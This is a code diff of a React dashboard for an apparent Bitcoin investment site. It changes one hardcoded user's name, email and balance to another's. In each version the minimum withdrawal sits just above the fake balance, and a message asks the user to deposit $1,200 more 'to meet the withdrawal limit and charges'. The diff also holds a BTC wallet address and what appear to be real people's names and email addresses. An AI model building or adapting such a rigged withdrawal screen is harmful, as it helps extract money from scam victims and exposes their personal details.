@@ -54,13 +54,13 @@ export default function Dashboard() {
   const [timeRange, setTimeRange] = useState("7"); // Default 7 days
   const [currentPrice, setCurrentPrice] = useState(null);
 
-  const userName = "Aliyah Eastham";
+  const userName = "Marcus Garvey";
   const btcWalletAddress = "bc1qr0j4swu6n56jakfawe09rjumt0t4wzhgzul3ep";
   const walletRef = useRef(null);
-  const balance = 42170;
-  const userEmail = "aliyaheastham223@gmail.com";
+  const balance = 68000;
+  const userEmail = "marcusgarvey223@gmail.com";
   const profileImageUrl = profileImg;
-  const MINIMUM_WITHDRAWAL = 43900;
+  const MINIMUM_WITHDRAWAL = 69200;
 
   // Fetch BTC OHLC data from CoinGecko API
   useEffect(() => {
@@ -723,7 +723,7 @@ export default function Dashboard() {
                         <p className="text-sm text-gray-500 mb-2">
                           {balance >= MINIMUM_WITHDRAWAL
                             ? "Your balance meets the minimum withdrawal requirement. Please contact your portfolio manager for final processing"
-                            : `Minimum withdrawal is $${MINIMUM_WITHDRAWAL.toLocaleString()}. Please deposit $1,900 to meet the withdrawal limit.`}
+                            : `Minimum withdrawal is $${MINIMUM_WITHDRAWAL.toLocaleString()}. Please deposit $1,200 to meet the withdrawal limit and charges.`}
                         </p>
                       )}
                     </div>
